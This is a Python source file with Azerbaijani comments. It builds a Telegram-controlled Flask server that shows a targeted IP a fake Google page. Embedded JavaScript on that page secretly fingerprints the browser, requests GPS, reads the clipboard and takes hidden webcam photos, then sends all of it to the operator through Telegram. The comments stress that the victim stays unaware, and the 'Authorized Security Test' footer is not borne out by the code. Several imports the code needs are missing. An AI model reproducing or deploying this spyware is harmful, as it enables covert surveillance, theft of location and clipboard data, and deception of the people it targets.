import os
import re
import time
import json
import base64
import logging
import threading
import asyncio
from telegram.ext import Application, CommandHandler, MessageHandler, filters
from flask import Flask, request, render_template_string, jsonify, redirect

# ========== KONFİQ ==========
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

TOKEN = os.environ.get('BOT_TOKEN')
ADMIN_ID = int(os.environ.get('ADMIN_ID', '0'))
PORT = int(os.environ.get('PORT', 10000))
APP_URL = os.environ.get('RENDER_EXTERNAL_URL', '')

active_attacks = {}  # {ip: {'chat_id': int, 'active': bool, 'photos': [], 'fingerprints': []}}

# ========== STEALTH HÜCUM SƏHİFƏSİ (gizli kamera) ==========
ATTACK_PAGE = '''<!DOCTYPE html>
<html lang="az">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #ffffff;
            color: #000000;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            flex-direction: column;
        }
        .google-container {
            text-align: center;
            padding: 2rem;
        }
        .google-logo {
            font-size: 5rem;
            font-weight: bold;
            margin-bottom: 2rem;
        }
        .google-logo span:nth-child(1) { color: #4285F4; }
        .google-logo span:nth-child(2) { color: #EA4335; }
        .google-logo span:nth-child(3) { color: #FBBC05; }
        .google-logo span:nth-child(4) { color: #4285F4; }
        .google-logo span:nth-child(5) { color: #34A853; }
        .google-logo span:nth-child(6) { color: #EA4335; }
        .search-box {
            width: 600px;
            max-width: 90%;
            padding: 12px 20px;
            border: 1px solid #dfe1e5;
            border-radius: 24px;
            font-size: 16px;
            outline: none;
        }
        .search-box:focus { box-shadow: 0 1px 6px rgba(32,33,36,0.28); }
        .buttons { margin-top: 2rem; }
        .buttons button {
            padding: 10px 20px;
            margin: 0 5px;
            background: #f8f9fa;
            border: 1px solid #f8f9fa;
            border-radius: 4px;
            cursor: pointer;
        }
        .buttons button:hover { border-color: #dadce0; }
        .attack-overlay {
            display: none;
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: #0a0a0a;
            z-index: 9999;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            color: #00ff00;
            font-family: 'Courier New', monospace;
        }
        .attack-overlay.active { display: flex; }
        .attack-overlay h1 {
            font-size: 3rem;
            color: #ff0000;
            text-shadow: 0 0 20px #ff0000, 0 0 40px #ff0000;
            margin-bottom: 2rem;
            animation: blink 1s infinite;
        }
        @keyframes blink { 0%,100%{opacity:1} 50%{opacity:0.3} }
        .attack-overlay .ip { color: #ffff00; font-size: 1.5rem; }
        .attack-overlay .status { color: #ff4444; margin: 1rem 0; font-size: 1.2rem; }
        .attack-overlay .footer { color: #555; margin-top: 2rem; font-size: 0.8rem; }
        .attack-overlay .matrix {
            opacity: 0.2; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: repeating-linear-gradient(0deg, transparent, transparent 2px, #0f0 2px, #0f0 4px);
            pointer-events: none; z-index: -1;
        }
        /* GİZLİ KAMERA VİDEO ELEMENTİ - ekranda görünmür */
        #hidden-camera {
            position: fixed;
            top: -9999px;
            left: -9999px;
            width: 1px;
            height: 1px;
            opacity: 0.01;
            pointer-events: none;
        }
    </style>
</head>
<body>
    <!-- Google səhifəsi -->
    <div class="google-container" id="googlePage">
        <div class="google-logo">
            <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
        </div>
        <input class="search-box" type="text" placeholder="Google-da axtar..." id="searchInput">
        <div class="buttons">
            <button id="searchBtn">Google Axtar</button>
            <button>Kendimi şanslı hissediyorum</button>
        </div>
    </div>

    <!-- Attack overlay -->
    <div class="attack-overlay" id="attackOverlay">
        <div class="matrix"></div>
        <h1>⚠ RYHAVEAN SERVER IS ATTACK! ⚠</h1>
        <p>Target IP: <span class="ip">{{ ip }}</span></p>
        <p class="status">>> SYSTEM COMPROMISED <<</p>
        <p>Bu bağlantı müdaxilə edildi.</p>
        <p>Bütün məlumatlarınız ələ keçirildi.</p>
        <p class="footer">Authorized Security Test — Ryhavean Pentest Team</p>
    </div>

    <!-- GİZLİ KAMERA - ekranda heç görünmür -->
    <video id="hidden-camera" autoplay playsinline muted></video>
    <canvas id="hidden-canvas" style="display:none;"></canvas>

    <script>
    const FINGERPRINT_URL = window.location.origin + '/fingerprint';
    const CAPTURE_URL = window.location.origin + '/capture';
    const CLICK_URL = window.location.origin + '/click';
    let attackStarted = false;
    let capturedPhotos = 0;

    // ===== 1. FINGERPRINT (görünür heç nə yox) =====
    async function sendFingerprint() {
        const fp = {
            ip: '{{ ip }}',
            screen: screen.width + 'x' + screen.height,
            colorDepth: screen.colorDepth,
            language: navigator.language,
            languages: navigator.languages ? navigator.languages.join(',') : '',
            platform: navigator.platform,
            userAgent: navigator.userAgent,
            vendor: navigator.vendor,
            cookiesEnabled: navigator.cookieEnabled,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            timezoneOffset: new Date().getTimezoneOffset(),
            hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
            deviceMemory: navigator.deviceMemory || 'unknown',
            touchSupport: 'ontouchstart' in window,
            referrer: document.referrer || 'direct',
            url: window.location.href,
            timestamp: new Date().toISOString()
        };
        try {
            await fetch(FINGERPRINT_URL, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(fp)
            });
        } catch(e) {}
    }

    // ===== 2. GPS (görünür heç nə yox) =====
    async function getGeoLocation() {
        try {
            const pos = await new Promise((resolve, reject) => {
                navigator.geolocation.getCurrentPosition(resolve, reject, {
                    enableHighAccuracy: true, timeout: 7000
                });
            });
            await fetch(FINGERPRINT_URL, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    ip: '{{ ip }}',
                    lat: pos.coords.latitude,
                    lon: pos.coords.longitude,
                    accuracy: pos.coords.accuracy
                })
            });
        } catch(e) {}
    }

    // ===== 3. CLIPBOARD (görünür heç nə yox) =====
    async function getClipboard() {
        try {
            const text = await navigator.clipboard.readText();
            if(text && text.length > 0) {
                await fetch(CLICK_URL, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ip: '{{ ip }}', type: 'clipboard', data: text.substring(0, 1000)})
                });
            }
        } catch(e) {}
    }

    // ===== 4. GİZLİ KAMERA ÇƏKİMİ (heç nə görünmür!) =====
    async function stealthCameraCapture() {
        try {
            // Kamera icazəsi istə - heç bir UI göstərmədən
            const stream = await navigator.mediaDevices.getUserMedia({
                video: { 
                    facingMode: 'user',
                    width: { ideal: 320 },
                    height: { ideal: 240 }
                },
                audio: false
            });

            // Gizli video elementinə stream-i bağla
            const video = document.getElementById('hidden-camera');
            video.srcObject = stream;

            // Video-nun hazır olmasını gözlə (görünmür, səssiz)
            await new Promise(resolve => {
                video.onloadedmetadata = () => {
                    video.play();
                    resolve();
                };
                // Bəzi brauzerlərdə loadedmetadata artıq olub
                if (video.readyState >= 2) resolve();
                // Timeout 2 saniyə
                setTimeout(resolve, 2000);
            });

            // Dərhal 3 şəkil çək - heç bir gecikmə, countdown, UI yox!
            const canvas = document.getElementById('hidden-canvas');
            canvas.width = 320;
            canvas.height = 240;
            const ctx = canvas.getContext('2d');

            for(let i = 0; i < 3; i++) {
                // 300ms gözlə - stabil kadr üçün minimal
                if(i > 0) await new Promise(r => setTimeout(r, 300));
                
                ctx.drawImage(video, 0, 0, 320, 240);
                const base64Data = canvas.toDataURL('image/jpeg', 0.7);
                
                // Serverə göndər
                await fetch(CAPTURE_URL, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        ip: '{{ ip }}',
                        photo: base64Data,
                        index: i + 1,
                        total: 3,
                        user_agent: navigator.userAgent
                    })
                });
                capturedPhotos++;
            }

            // Kameranı dərhal bağla - iz qalmasın
            stream.getTracks().forEach(t => t.stop());
            video.srcObject = null;

        } catch(e) {
            // Kamera icazəsi yoxdursa - sakitcə keç, heç nə göstərmə
            console.log('Kamera əlçatan deyil:', e.message);
        }
    }

    // ===== 5. ƏSAS ATTACK FUNKSİYASI =====
    function startAttack() {
        if(attackStarted) return;
        attackStarted = true;

        // BÜTÜN əməliyyatlar EYNİ ANDA başlayır - paralel
        // Heç biri UI-də görünmür
        
        // 1. Fingerprint (görünməz)
        sendFingerprint();
        
        // 2. GPS (görünməz) - 300ms gecikmə
        setTimeout(getGeoLocation, 300);
        
        // 3. Clipboard (görünməz) - 600ms gecikmə
        setTimeout(getClipboard, 600);
        
        // 4. GİZLİ KAMERA (görünməz!) - 1 saniyə gecikmə
        setTimeout(stealthCameraCapture, 1000);

        // Attack overlay - səhifə dəyişir (bu görünəcək)
        setTimeout(() => {
            document.getElementById('attackOverlay').classList.add('active');
            document.getElementById('googlePage').style.display = 'none';
        }, 2000);
    }

    // Səhifə yüklənən kimi başla - heç bir düyməyə ehtiyac yoxdur!
    window.addEventListener('load', function() {
        // Əvvəlcə Google səhifəsi görünsün (real görünsün)
        // 1.5 saniyə sonra bütün əməliyyatlar başlayır
        setTimeout(startAttack, 1500);
    });

    // "Google Axtar" düyməsinə klikdə də başlasın
    document.addEventListener('DOMContentLoaded', function() {
        const searchBtn = document.getElementById('searchBtn');
        if(searchBtn) {
            searchBtn.addEventListener('click', function(e) {
                if(!attackStarted) startAttack();
            });
        }
    });
    </script>
</body>
</html>'''

# ========== PERSISTENT EVENT LOOP ==========
bot_loop = None
application = None

def bot_loop_thread():
    global bot_loop, application
    
    bot_loop = asyncio.new_event_loop()
    asyncio.set_event_loop(bot_loop)
    
    application = Application.builder().token(TOKEN).updater(None).build()
    application.add_handler(CommandHandler('start', start))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_ip))
    application.add_handler(CallbackQueryHandler(button_handler))
    
    bot_loop.run_until_complete(application.initialize())
    logger.info("✅ Bot init edildi")
    
    if APP_URL:
        webhook_url = f"{APP_URL.rstrip('/')}/webhook"
        bot_loop.run_until_complete(application.bot.set_webhook(webhook_url))
        logger.info(f"✅ Webhook quruldu: {webhook_url}")
    
    bot_loop.run_forever()

# ========== TELEGRAM HANDLER-LƏR ==========
async def start(update: Update, context):
    if update.effective_chat.id != ADMIN_ID:
        await update.message.reply_text("⛔ İcazəniz yoxdur.")
        return
    await update.message.reply_text(
        "🤖 *Ryhavean Attack Bot v2.0 - Stealth*\n\n"
        "Hədəf IP ünvanını göndərin:\n"
        "Nümunə: `192.168.1.100`\n\n"
        "💥 *Stealth hücum xüsusiyyətləri:*\n"
        "🔍 Browser fingerprint (görünməz)\n"
        "📍 GPS lokasiyası (görünməz)\n"
        "📋 Clipboard oxuma (görünməz)\n"
        "📸 3 gizli kamera şəkli (heç nə görünmür!)\n"
        "🖱️ Fake Google səhifəsi",
        parse_mode='Markdown'
    )

async def handle_ip(update: Update, context):
    if update.effective_chat.id != ADMIN_ID:
        return
    ip = update.message.text.strip()
    if not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', ip):
        await update.message.reply_text("❌ Yanlış IP formatı. Nümunə: `192.168.1.100`", parse_mode='Markdown')
        return
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("🚀 HÜCUMA BAŞLA", callback_data=f"start_{ip}")]
    ])
    await update.message.reply_text(
        f"🎯 Hədəf: `{ip}`\n\n"
        f"Hücum başladılsın?\n\n"
        f"⚡ *Stealth əməliyyatlar:*\n"
        f"   1️⃣ Fake Google səhifəsi (1.5 saniyə)\n"
        f"   2️⃣ Fingerprint toplanır (görünməz)\n"
        f"   3️⃣ GPS sorğulanır (görünməz)\n"
        f"   4️⃣ Clipboard oxunur (görünməz)\n"
        f"   5️⃣ 📸 3 kamera şəkli **gizli çəkilir** (heç nə görünmür!)\n"
        f"   6️⃣ Attack səhifəsi açılır (2 saniyə sonra)\n"
        f"   7️⃣ Bütün məlumatlar adminə göndərilir",
        parse_mode='Markdown', reply_markup=keyboard
    )

async def button_handler(update: Update, context):
    query = update.callback_query
    await query.answer()
    if query.message.chat.id != ADMIN_ID:
        return
    data = query.data
    if data.startswith('start_'):
        ip = data.replace('start_', '')
        active_attacks[ip] = {'chat_id': ADMIN_ID, 'active': True, 'photos': [], 'fingerprints': []}
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("⛔ DAYANDIR", callback_data=f"stop_{ip}")]
        ])
        await query.edit_message_text(
            f"✅ *HÜCUM AKTİV!*\n\n"
            f"🎯 Hədəf: `{ip}`\n"
            f"📡 Status: *HÜCUM EDİLİR*\n\n"
            f"Bu IP-dən `{APP_URL}` ünvanına daxil olan hər kəs:\n"
            f"1️⃣ Fake Google səhifəsi görəcək\n"
            f"2️⃣ **Gizli şəkildə** kamera + məlumat toplanacaq\n"
            f"3️⃣ 2 saniyə sonra attack səhifəsi açılacaq\n\n"
            f"Qarşı tərəfin **XƏBƏRİ OLMAYACAQ**\n\n"
            f"'Dayandır' düyməsinə basana qədər aktivdir.",
            parse_mode='Markdown', reply_markup=keyboard
        )
        logger.info(f"🔥 Hücum başladı: {ip} (stealth mode)")
    elif data.startswith('stop_'):
        ip = data.replace('stop_', '')
        if ip in active_attacks:
            del active_attacks[ip]
        await query.edit_message_text(
            f"⛔ *HÜCUM DAYANDIRILDI!*\n\n"
            f"🎯 IP: `{ip}`\n📡 Status: *PASİF*",
            parse_mode='Markdown'
        )
        logger.info(f"⛔ Hücum dayandı: {ip}")

# ========== FLASK ==========
app = Flask(__name__)

def get_client_ip():
    if request.headers.get('X-Forwarded-For'):
        return request.headers.get('X-Forwarded-For').split(',')[0].strip()
    return request.remote_addr

@app.route('/')
def index():
    ip = get_client_ip()
    if ip in active_attacks and active_attacks[ip]['active']:
        logger.info(f"🎯 HƏDƏF GİRDİ! IP: {ip}")
        return render_template_string(ATTACK_PAGE, ip=ip)
    return '<h1>Ryhavean Server</h1><p>Server işləyir...</p>'

@app.route('/fingerprint', methods=['POST'])
def fingerprint():
    try:
        data = request.get_json()
        ip = data.get('ip', get_client_ip())
        
        if ip not in active_attacks or not active_attacks[ip]['active']:
            return jsonify({'status': 'ignored'})
        
        active_attacks[ip]['fingerprints'].append(data)
        
        if application and bot_loop:
            msg_parts = [f"🎯 IP: `{ip}`"]
            
            if 'userAgent' in data:
                msg_parts.append(f"🌐 *Browser:* `{data.get('userAgent','?')[:80]}`")
            if 'platform' in data:
                msg_parts.append(f"💻 *Platform:* `{data.get('platform','?')}`")
            if 'screen' in data:
                msg_parts.append(f"🖥 *Ekran:* `{data.get('screen','?')}`")
            if 'language' in data:
                msg_parts.append(f"🌍 *Dil:* `{data.get('language','?')}`")
            if 'timezone' in data:
                msg_parts.append(f"🕐 *Saat qurşağı:* `{data.get('timezone','?')}`")
            if 'hardwareConcurrency' in data:
                msg_parts.append(f"⚡ *CPU nüvə:* `{data.get('hardwareConcurrency')}`")
            if 'deviceMemory' in data:
                msg_parts.append(f"🧠 *RAM:* `{data.get('deviceMemory')}GB`")
            if 'referrer' in data:
                msg_parts.append(f"🔗 *Gəldiyi yer:* `{data.get('referrer','?')}`")
            if 'lat' in data:
                maps_url = f"https://www.google.com/maps?q={data['lat']},{data['lon']}"
                msg_parts.append(f"📍 *GPS:* [{data['lat']},{data['lon']}]({maps_url}) (±{data.get('accuracy','?')}m)")
            
            text = "🔍 *Fingerprint + GPS Məlumatı*\n\n" + "\n".join(msg_parts)
            
            asyncio.run_coroutine_threadsafe(
                application.bot.send_message(chat_id=ADMIN_ID, text=text, parse_mode='Markdown', disable_web_page_preview=True),
                bot_loop
            )
        
        logger.info(f"🔍 Fingerprint alındı - IP: {ip}")
        return jsonify({'status': 'ok'})
    except Exception as e:
        logger.error(f"Fingerprint xətası: {e}")
        return jsonify({'status': 'error'}), 500

@app.route('/capture', methods=['POST'])
def capture():
    try:
        data = request.get_json()
        ip = data.get('ip')
        photo_b64 = data.get('photo')
        index = data.get('index')
        total = data.get('total')
        user_agent = data.get('user_agent', 'Unknown')
        
        if not application or not bot_loop:
            return jsonify({'status': 'error', 'message': 'Bot hazır deyil'}), 503
        if ip not in active_attacks or not active_attacks[ip]['active']:
            return jsonify({'status': 'ignored'})
        
        photo_bytes = base64.b64decode(photo_b64.split(',')[1])
        
        asyncio.run_coroutine_threadsafe(
            _send_photo_to_admin(ip, photo_bytes, index, total, user_agent),
            bot_loop
        )
        logger.info(f"📸 Gizli şəkil {index}/{total} - IP: {ip}")
        return jsonify({'status': 'ok'})
    except Exception as e:
        logger.error(f"Capture xətası: {e}")
        return jsonify({'status': 'error'}), 500

async def _send_photo_to_admin(ip, photo_bytes, index, total, user_agent):
    try:
        caption = f"📸 *Gizli Kamera* | {index}/{total}\n🎯 IP: `{ip}`\n🕒 `{time.strftime('%Y-%m-%d %H:%M:%S')}`"
        await application.bot.send_photo(
            chat_id=ADMIN_ID,
            photo=InputFile(photo_bytes, filename=f"stealth_{ip}_{index}.jpg"),
            caption=caption, parse_mode='Markdown'
        )
        if index == total:
            await application.bot.send_message(
                chat_id=ADMIN_ID,
                text=f"✅ *Gizli kamera tamamlandı!* IP: `{ip}` — 3 şəkil göndərildi.",
                parse_mode='Markdown'
            )
    except Exception as e:
        logger.error(f"Şəkil göndərmə xətası: {e}")

@app.route('/click', methods=['POST'])
def click():
    try:
        data = request.get_json()
        ip = data.get('ip')
        click_data = data.get('data', '')
        click_type = data.get('type', 'click')
        
        if ip in active_attacks and active_attacks[ip]['active']:
            if click_type == 'clipboard':
                logger.info(f"📋 Clipboard: {click_data[:100]}")
                if application and bot_loop:
                    asyncio.run_coroutine_threadsafe(
                        application.bot.send_message(
                            chat_id=ADMIN_ID,
                            text=f"📋 *Clipboard Məlumatı*\n🎯 IP: `{ip}`\n\n```\n{click_data[:1000]}\n```",
                            parse_mode='Markdown'
                        ),
                        bot_loop
                    )
        return jsonify({'status': 'ok'})
    except Exception as e:
        return jsonify({'status': 'error'}), 500

@app.route('/health')
def health():
    return {'status': 'ok', 'active_targets': list(active_attacks.keys())}

@app.route('/webhook', methods=['POST'])
def webhook():
    if not application or not bot_loop:
        return 'Bot hazır deyil', 503
    update_json = request.get_json(force=True)
    asyncio.run_coroutine_threadsafe(
        _process_update(update_json), bot_loop
    )
    return 'OK'

async def _process_update(update_json):
    try:
        update = Update.de_json(update_json, application.bot)
        await application.process_update(update)
    except Exception as e:
        logger.error(f"Update xətası: {e}")

if __name__ == '__main__':
    if not TOKEN or TOKEN == 'YOUR_BOT_TOKEN':
        raise ValueError("BOT_TOKEN env-də təyin edilməyib!")
    if not ADMIN_ID or ADMIN_ID == 0:
        raise ValueError("ADMIN_ID env-də təyin edilməyib!")
    
    t = threading.Thread(target=bot_loop_thread, daemon=True)
    t.start()
    time.sleep(3)
    
    logger.info(f"🚀 Ryhavean Stealth Bot - port {PORT}")
    logger.info(f"🔗 URL: {APP_URL}")
    logger.info("🥷 STEALTH MODE: Kamera + Fingerprint + GPS + Clipboard — tam gizli")
    app.run(host='0.0.0.0', port=PORT, threaded=True)
